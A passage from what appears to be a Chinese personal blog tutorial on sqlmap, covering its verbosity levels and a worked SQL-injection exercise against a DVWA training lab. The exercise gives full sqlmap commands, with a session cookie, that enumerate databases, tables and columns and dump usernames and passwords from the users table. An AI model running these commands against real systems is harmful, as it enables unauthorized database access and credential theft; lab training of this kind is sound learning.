sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：&ndash;output-dir=/tmp</p><h2 id=4-实际利用dvwa>4 实际利用(dvwa)<a hidden class=anchor aria-hidden=true href=#4-实际利用dvwa>#</a></h2><p>当给sqlmap这么一个url的时候，它会：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tex data-lang=tex><span style=display:flex><span>1、判断可注入的参数
</span></span><span style=display:flex><span>2、判断可以用那种SQL注入技术来注入
</span></span><span style=display:flex><span>3、识别出哪种数据库
</span></span><span style=display:flex><span>4、根据用户选择，读取哪些数据
</span></span></code></pre></div><p>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-tex data-lang=tex><span style=display:flex><span>0、只显示python错误以及严重的信息。
</span></span><span style=display:flex><span>1、同时显示基本信息和警告信息。（默认）
</span></span><span style=display:flex><span>2、同时显示debug信息。
</span></span><span style=display:flex><span>3、同时显示注入的payload。
</span></span><span style=display:flex><span>4、同时显示HTTP请求。
</span></span><span style=display:flex><span>5、同时显示HTTP响应头。
</span></span><span style=display:flex><span>6、同时显示HTTP响应页面。
</span></span></code></pre></div><p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># 判断注入点，因系统需要登录所以要加 cookie</span>
</span></span><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://172.31.5.7/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34;</span> --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low&#34;</span> -p id --batch
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 检测站点包含哪些数据库</span>
</span></span><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://172.31.5.7/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34;</span> --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low&#34;</span> -p id --dbs --batch
</span></span></code></pre></div><p><img loading=lazy src=/images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326220843373.png alt=image-20230326220843373></p><blockquote><p>技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数“&ndash;batch”命令来自动答复和判断</p></blockquote><p>可以看到有四个数据库，选择dvwa数据库获取其中的表名</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://172.31.5.7/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34;</span> --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low&#34;</span> -D dvwa --tables --batch
</span></span></code></pre></div><p><img loading=lazy src=/images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222505503.png alt=image-20230326222505503></p><p>可以看到，dvwa里面有两张表，分别是guestbook，users。选择users表获取表中的字段</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://172.31.5.7/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34;</span> --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low&#34;</span> -D dvwa -T users --columns
</span></span></code></pre></div><p><img loading=lazy src=/images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222602983.png alt=image-20230326222602983></p><p>可以看到里面有password，直接获取我们想要的内容 (账号/密码)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python sqlmap.py -u <span style=color:#e6db74>&#34;http://172.31.5.7/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#34;</span> --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low&#34;</span> -D dvwa -T users -C last_name,password  --dump --batch
</span></span></code></pre></div><p><img loading=lazy src=/images/SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8/image-20230326222852891.png alt=image-20230326222852891></p></div><footer class=post-footer><nav class=paginav><a class=prev href=https://senmer.github.io/posts/tech/cve/tomcat%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615/><span class=title>« 上一页</span><br><span>Tomcat任意写文件漏洞复现(CVE-2017-12615)</span></a>
<a class=next href=https://senmer.github.io/posts/tech/msf/msf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/><span class=title>下一页 »</span><br><span>MSF漏洞利用</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share SQLmap安装和使用 on twitter" href="https://twitter.com/intent/tweet/?text=SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8&amp;url=https%3a%2f%2fsenmer.github.io%2fposts%2ftech%2fscanning_tools%2fsqlmap%25E5%25AE%2589%25E8%25A3%2585%25E5%2592%258C%25E4%25BD%25BF%25E7%2594%25A8%2f&amp;hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SQLmap安装和使用 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsenmer.github.io%2fposts%2ftech%2fscanning_tools%2fsqlmap%25E5%25AE%2589%25E8%25A3%2585%25E5%2592%258C%25E4%25BD%25BF%25E7%2594%25A8%2f&amp;title=SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8&amp;summary=SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8&amp;source=https%3a%2f%2fsenmer.github.io%2fposts%2ftech%2fscanning_tools%2fsqlmap%25E5%25AE%2589%25E8%25A3%2585%25E5%2592%258C%25E4%25BD%25BF%25E7%2594%25A8%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SQLmap安装和使用 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fsenmer.github.io%2fposts%2ftech%2fscanning_tools%2fsqlmap%25E5%25AE%2589%25E8%25A3%2585%25E5%2592%258C%25E4%25BD%25BF%25E7%2594%25A8%2f&title=SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SQLmap安装和使用 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsenmer.github.io%2fposts%2ftech%2fscanning_tools%2fsqlmap%25E5%25AE%2589%25E8%25A3%2585%25E5%2592%258C%25E4%25BD%25BF%25E7%2594%25A8%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SQLmap安装和使用 on whatsapp" href="https://api.whatsapp.com/send?text=SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8%20-%20https%3a%2f%2fsenmer.github.io%2fposts%2ftech%2fscanning_tools%2fsqlmap%25E5%25AE%2589%25E8%25A3%2585%25E5%2592%258C%25E4%25BD%25BF%25E7%2594%25A8%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share SQLmap安装和使用 on telegram" href="https://telegram.me/share/url?text=SQLmap%e5%ae%89%e8%a3%85%e5%92%8c%e4%bd%bf%e7%94%a8&amp;url=https%3a%2f%2fsenmer.github.io%2fposts%2ftech%2fscanning_tools%2fsqlmap%25E5%25AE%2589%25E8%25A3%2585%25E5%2592%258C%25E4%25BD%25BF%25E7%2594%25A8%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></div><style>.comments_details summary::marker{font-size:20px;content:'👉展开评论';color:var(--content)}.comments_details[open] summary::marker{font-size:20px;content:'👇关闭评论';color:var(--content)}</style><div><details class=comments_details><summary style="cursor:pointer;margin:50px 0 20px;width:130px"><span style=font-size:20px;color:var(--content)>...</span></summary><div id=tcomment></div></details><script src=https://cdn.staticfile.org/twikoo/1.6.16/twikoo.all.min.js></script><script>twikoo.init({envId:"https://hugo-api-khaki.vercel.app/# 填写自己的twikoo id",el:"#tcomment",lang:"zh-CN",region:null,path:window.TWIKOO_MAGIC_PATH||window.location.pathname})</script></div></article></main><footer class=footer><span>Copyright
&copy;
2020-2023
<a href=https://senmer.github.io/ style=color:#939393>WZ's Blog</a>
All Rights Reserved</span>
<a href=https://beian.miit.gov.cn/ target=_blank style=color:#939393></a>&nbsp;
<span><a target=_blank href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=null" style=display:inline-block;text-decoration:none;height:20px;color:#939393><img src style="float:left;margin:0 5px 0 0"></a></span>
<span id=busuanzi_container><span class="fa fa-user"></span> <span id=busuanzi_value_site_uv></span>
<span class="fa fa-eye"></span> <span id=busuanzi_value_site_pv></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><span class=topInner><svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg><span id=read_progress></span></span></a>
<script>document.addEventListener("scroll",function(){const t=document.getElementById("read_progress"),n=document.documentElement.scrollHeight,s=document.documentElement.clientHeight,o=document.documentElement.scrollTop||document.body.scrollTop;t.innerText=((o/(n-s)).toFixed(2)*100).toFixed(0)})</script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>let mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>200||document.documentElement.scrollTop>200?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{(function(){document.cookie="change-themes="+escape("false")})(),document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.body.addEventListener("copy",function(e){if(window.getSelection().toString()&&window.getSelection().toString().length>50){let t=e.clipboardData||window.clipboardData;if(t){e.preventDefault();let n=window.getSelection().toString()+`

————————————————
版权声明：本文为「WZ's Blog」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：`+location.href,s=window.getSelection().toString()+`

————————————————
版权声明：本文为「WZ's Blog」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：`+location.href;t.setData("text/html",n),t.setData("text/plain",s)}}})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const s=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerText="复制";function i(){t.innerText="已复制！",setTimeout(()=>{t.innerText="复制"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){let t=e.textContent+`
————————————————
版权声明：本文为「WZ's Blog」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：`+location.href;navigator.clipboard.writeText(t),i();return}const n=document.createRange();n.selectNodeContents(e);const s=window.getSelection();s.removeAllRanges(),s.addRange(n);try{document.execCommand("copy"),i()}catch{}s.removeRange(n)});let l=e.className.replaceAll("language-",""),n=document.createElement("div"),a=document.createElement("div"),r=document.createElement("div"),c=document.createElement("div"),o=document.createElement("div");o.innerText=l,n.setAttribute("class","mac-tool"),a.setAttribute("class","mac bb1"),r.setAttribute("class","mac bb2"),c.setAttribute("class","mac bb3"),o.setAttribute("class","language-type"),n.appendChild(a),n.appendChild(r),n.appendChild(c),n.appendChild(o),s.classList.contains("highlight")?(s.appendChild(t),s.appendChild(n)):s.parentNode.firstChild==s||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?(e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t),s.appendChild(n)):(e.parentNode.appendChild(t),s.appendChild(n)))})</script><script>$("code[class^=language] ").on("mouseover",function(){this.clientWidth<this.scrollWidth&&($(this).css("width","135%"),$(this).css("border-top-right-radius","var(--radius)"))}).on("mouseout",function(){$(this).css("width","100%"),$(this).css("border-top-right-radius","unset")})</script></body></html>